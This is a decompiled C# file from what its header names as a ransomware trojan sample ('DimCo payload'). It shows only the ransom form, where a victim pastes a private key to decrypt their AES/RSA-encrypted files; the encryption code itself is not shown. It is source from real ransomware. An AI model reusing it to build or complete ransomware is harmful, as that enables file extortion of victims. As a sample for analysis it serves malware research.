// Decompiled with JetBrains decompiler
// Type: DimCo_payload.Form1
// Assembly: DimCo payload, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6D97B6CD-FB99-4BFA-8324-BC32038C0234
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.MSIL.Encoder.gen-23bdeb9ae6a8f414c33ed8baf2de46477d0bc7f469dd543d60332a04e0b7c039.exe

using Newtonsoft.Json;
using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace DimCo_payload
{
  public class Form1 : Form
  {
    private IContainer components;
    private RichTextBox richTextBox1;
    private Button button1;

    public Form1() => this.InitializeComponent();

    private static void setup(string xml)
    {
      foreach (string str in global.encrypted)
      {
        try
        {
          if (global.Keys.PrivateKey == null)
            break;
          Console.WriteLine("decrypting " + str);
          Tuple<byte[], byte[]> encoded = JsonConvert.DeserializeObject<Tuple<byte[], byte[]>>(File.ReadAllText(str));
          File.WriteAllBytes(str, DimCo_payload.Encryption.Encryption.Decrypt_File_AESRSA(encoded, xml));
          File.Move(str, Path.ChangeExtension(str, (string) null));
        }
        catch
        {
          int num = (int) MessageBox.Show("Incorrect key. Try again.");
          break;
        }
      }
    }

    private void button1_Click(object sender, EventArgs e) => Form1.setup(this.richTextBox1.Text);

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.richTextBox1 = new RichTextBox();
      this.button1 = new Button();
      this.SuspendLayout();
      this.richTextBox1.Location = new Point(0, 0);
      this.richTextBox1.Name = "richTextBox1";
      this.richTextBox1.Size = new Size(378, 238);
      this.richTextBox1.TabIndex = 0;
      this.richTextBox1.Text = "";
      this.button1.Location = new Point(303, 235);
      this.button1.Name = "button1";
      this.button1.Size = new Size(75, 23);
      this.button1.TabIndex = 1;
      this.button1.Text = "Apply";
      this.button1.UseVisualStyleBackColor = true;
      this.button1.Click += new EventHandler(this.button1_Click);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(377, 257);
      this.Controls.Add((Control) this.button1);
      this.Controls.Add((Control) this.richTextBox1);
      this.FormBorderStyle = FormBorderStyle.FixedSingle;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Form1);
      this.ShowIcon = false;
      this.ResumeLayout(false);
    }
  }
}
